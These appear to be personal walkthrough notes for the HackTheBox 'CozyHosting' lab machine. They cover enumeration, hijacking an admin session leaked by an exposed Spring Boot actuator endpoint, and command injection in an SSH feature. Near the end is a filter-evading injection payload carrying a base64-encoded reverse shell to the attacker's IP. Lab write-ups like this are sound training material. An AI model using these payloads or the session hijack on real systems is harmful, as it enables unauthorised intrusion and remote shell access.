CozyHosting

HackTheBox - Linux - Easy

Enumaration:

Scanning all TCP Ports
nmap -sV 10.129.229.88 -p-
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)

Scanning all UDP Ports

Website
when going to http://10.129.229.88 i get redirected to http://cozyhosting.htb/
adding domain to /etc/hosts
Website has a login field "Designed by BootstrapMade" making a request to "/login"
The site dosnt tell if the username or password is wrong "Invalid username or password"
Website storage: just cookie
Website sourcecode: nothing interessting

Scanning directories
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://cozyhosting.htb
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/admin                (Status: 401) [Size: 97]
/logout               (Status: 204) [Size: 0]
/error                (Status: 500) [Size: 73]
/http%3A%2F%2Fwww     (Status: 400) [Size: 435]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 435]
/%C0                  (Status: 400) [Size: 435]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 435]
/http%3A%2F%2Fblog    (Status: 400) [Size: 435]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 435]
/27079%5Fclassicpeople2%2Ejpg (Status: 200) [Size: 0]
/children%2527s_tent  (Status: 200) [Size: 0]
/tiki%2Epng           (Status: 200) [Size: 0]
/Wanted%2e%2e%2e      (Status: 200) [Size: 0]
/How_to%2e%2e%2e      (Status: 200) [Size: 0]
/External%5CX-News    (Status: 400) [Size: 435]
/squishdot_rss10%2Etxt (Status: 200) [Size: 0]
/b33p%2Ehtml          (Status: 200) [Size: 0]
/help%2523drupal      (Status: 200) [Size: 0]
<snip>

many other 200 that just show an error page

check if there is something behind /admin unprotected
dirb http://cozyhosting.htb/admin
> nothing


Scanning vhosts
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cozyhosting.htb
no other vhosts


Trying SQL injection
' OR 1=1 -- 

Trying SQLMAP with a request copied from burp
sqlmap -r request.txt --batch 
[07:22:54] [WARNING] POST parameter 'username' does not seem to be injectable
[07:24:04] [WARNING] POST parameter 'password' does not seem to be injectable


Errorpages
If dir not found: 404

Whitelabel Error Page
This application has no explicit mapping for /error, so you are seeing this as a fallback.
Fri Jul 04 12:37:03 UTC 2025
There was an unexpected error (type=Not Found, status=404).


but on /error there is statuscode 999

Whitelabel Error Page
This application has no explicit mapping for /error, so you are seeing this as a fallback.
Fri Jul 04 12:37:46 UTC 2025
There was an unexpected error (type=None, status=999).


Researched "Whitelabel Error Page"
Its from Springboot a Framwork for Java
https://stackoverflow.com/questions/61029340/spring-security-redirects-to-page-with-status-code-999

it seems that statuscode 999 is somehow linked to the login
curl -X POST http://cozyhosting.htb/error \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: JSESSIONID=DBEF37A92CC770C28D150DFA352B9278"

This reseted my cookie but i got the same response
{"timestamp":"2025-07-04T12:49:12.019+00:00","status":999,"error":"None"}

List of bootspring endpoint
https://docs.spring.io/spring-boot/reference/actuator/endpoints.html added them to > endpoint.txt

gobuster dir -w endpoint.txt -u http://cozyhosting.htb/actuator
/health               (Status: 200) [Size: 15]          -> Shows application health information
/env                  (Status: 200) [Size: 4957]        -> Exposes properties from Spring’s ConfigurableEnvironment. Subject to sanitization.
/sessions             (Status: 200) [Size: 98]          -> Allows retrieval and deletion of user sessions from a Spring Session-backed session store. Requires a servlet-based web      application that uses Spring Session.

/mappings             (Status: 200) [Size: 9938]        -> Displays a collated list of all @RequestMapping paths.
/beans                (Status: 200) [Size: 127224]      -> Displays a complete list of all the Spring beans in your application.


curl http://cozyhosting.htb/actuator/sessions
{"D4812344A2A37EB43CE139342167A32D":"UNAUTHORIZED","DF7A903D1CF0D22DD14CDCCAD38847D0":"kanderson"}

The unauthorized is my cookie, i replace mine with the one from kanderson
-> going to /admin im logged im as him


Enumaration of Adminpannel
kanderson got a notification:
    Keep your hosts patched!
    3 hosts require your attention.

There a overview of which hosts are patch and which not.
Theres also a function: Include host into automatic patching
    Please note
    For Cozy Scanner to connect the private key that you received upon registration should be included in your host's .ssh/authorised_keys file.

Connection settings need Hostname and Username
i tried: 
suspiciousmcnulty & kanderson -> Host from list above
cozyhosting.htb & kanderson
127.0.0.1 & kanderson

in burp i saw this tool connects to 
request POST /executessh
response GET /admin?error=ssh:%20Could%20not%20resolve%20hostname%20hostname:%20Temporary%20failure%20in%20name%20resolution 4

this looks like a script that just executs SSH this might be exploitable
host=10.10.14.94&username=kanderson$(id)
kandersonuid=1001(app)

the app filters for whitespaces in the username, so i used this to get a shell
host=10.10.14.94&username=kanderson%60echo%24%7BIFS%7DYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC45NC80NDQ0IDA%2BJjEK%7Cbase64%24%7BIFS%7D-d%7Cbash%60

upgrade shell: python3 -c 'import pty; pty.spawn("/bin/bash")'


--> NEXT STEP: SEARCH CONFIG FILES

